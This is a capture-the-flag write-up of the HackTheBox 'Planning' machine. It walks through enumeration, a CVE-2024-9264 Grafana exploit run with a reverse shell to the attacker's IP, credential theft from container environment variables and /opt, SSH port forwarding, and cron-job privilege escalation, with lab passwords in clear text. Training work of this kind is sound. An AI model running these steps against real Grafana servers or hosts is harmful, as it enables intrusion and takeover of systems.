---
title: Planning
tags:
  - HackTheBox
  - Easy
  - Linux
  - Grafana
  - CVE
  - Docker
  - Tunnelling
  - Cron-Job
date: 2025-05-12T00:00:05Z
---
![](Pasted%20image%2020250512164751.png)

> I get the following credentials: `admin:0D5oT70Fq13EvB5r`

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- planning.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http
|_http-title: Edukate - Online Education Website
```

So I checked its website:

![](Pasted%20image%2020250512164946.png)

There are the following pages:
- `index.php`
- `about.php`
- `course.php`
- `contact.php`
- `detail.php` <- this one is more difficult to find

So I'll enumerate for subdomains with [Ffuf 🐳](/notes/tools/Ffuf.md):
- I had to use a different wordlist: `/usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u https://FUZZ.planning.htb/

[redacted]
grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 98ms]
```

So I added it to my known hosts.

![](Pasted%20image%2020250512175737.png)

Grafana version 11.0.0 is discovered. So I logged in with the given credentials:

## Weaponization

I searched for "grafana 11.0.0 cve" and found [CVE-2024-9264a](https://github.com/nollium/CVE-2024-9264a), [this blog](https://zekosec.com/blog/rce-grafana-cve-2024-9264/) and the [PoC of the blog](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit).

## Exploitation

I cloned the repository and executed the script:

```shell
git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit.git

python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.22 --reverse-port 666
```

> Got a shell :D

![](Pasted%20image%2020250512180904.png)

![](Pasted%20image%2020250512181220.png)

## Pivoting

We are inside of a docker container, so we want to pivot to the host machine.

There is an executable in the root called `run.sh`, so I'll check its contents:

![](Pasted%20image%2020250512181404.png)

But it doesn't contain anything useful, so I decided to check the environment variables:

```shell
printenv

[redacted]
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
```

> Got the host credentials :D `enzo:RioTecRANDEntANT!`

### User flag

I am now `enzo` and can get user flag:

![](Pasted%20image%2020250512182628.png)

## Privilege Escalation

Let's find internal active internet connections:

```shell
netstat -ant

Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33839         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 10.10.11.68:80          10.10.14.22:36116       ESTABLISHED
tcp        0      0 127.0.0.1:3000          127.0.0.1:32928         TIME_WAIT  
tcp        0      0 127.0.0.1:3000          127.0.0.1:49704         TIME_WAIT  
tcp        0      0 127.0.0.1:40246         127.0.0.1:3000          TIME_WAIT  
tcp        0      0 127.0.0.1:3000          127.0.0.1:34028         TIME_WAIT  
tcp        0      0 127.0.0.1:58498         127.0.0.1:3000          TIME_WAIT  
tcp        0      0 172.17.0.1:60430        172.17.0.2:3000         TIME_WAIT  
tcp        0      0 127.0.0.1:40234         127.0.0.1:3000          TIME_WAIT  
tcp        0      0 127.0.0.1:3000          127.0.0.1:46580         TIME_WAIT  
tcp        0      0 127.0.0.1:3000          127.0.0.1:35248         TIME_WAIT  
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0   1796 10.10.11.68:22          10.10.14.22:47148       ESTABLISHED
```

Checking the port 8000:

```shell
curl -I 127.0.0.1:8000

HTTP/1.1 401 Unauthorized
X-Powered-By: Express
WWW-Authenticate: Basic realm="Restricted Area"
Content-Type: text/html; charset=utf-8
Content-Length: 0
ETag: W/"0-2jmj7l5rSw0yVb/vlWAYkK/YBwk"
Date: Mon, 12 May 2025 16:28:43 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

So I port forwarded port 8000 to my machine:

```shell
ssh -L 8888:127.0.0.1:8000 enzo@planning.htb
```

Then I visited it and I'm asked for credentials:

![](Pasted%20image%2020250512184127.png)

So I checked back the machine to search for credentials. Looking inside `/opt` I found the following:

![](Pasted%20image%2020250512184216.png)

> Credentials: `root:P4ssw0rdS0pRi0T3c`

![](Pasted%20image%2020250512184544.png)

Crontab is being used. So I can create a copy of the bash console and save it into the `/tmp` directory. To do this I'll create a new one and use the following payload:

```shell
cp /bin/bash /tmp/poc && chmod +x /tmp/poc
```

![](Pasted%20image%2020250512191839.png)

![](Pasted%20image%2020250512191745.png)

### Root flag

![](Pasted%20image%2020250512192121.png)

==Machine pwned!==